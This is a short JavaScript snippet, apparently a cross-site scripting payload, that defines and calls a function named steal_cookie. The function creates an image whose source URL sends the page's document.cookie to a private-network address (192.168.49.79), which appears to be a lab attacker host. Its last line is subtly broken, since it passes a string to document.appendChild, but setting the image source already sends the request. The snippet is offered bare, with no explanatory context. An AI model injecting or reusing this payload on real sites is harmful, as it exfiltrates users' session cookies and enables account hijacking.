function steal_cookie(){
    var img = document.createElement("img");
    img.src = "http://192.168.49.79:80/?" + document.cookie;
    document.appendChild('img')
}
steal_cookie()
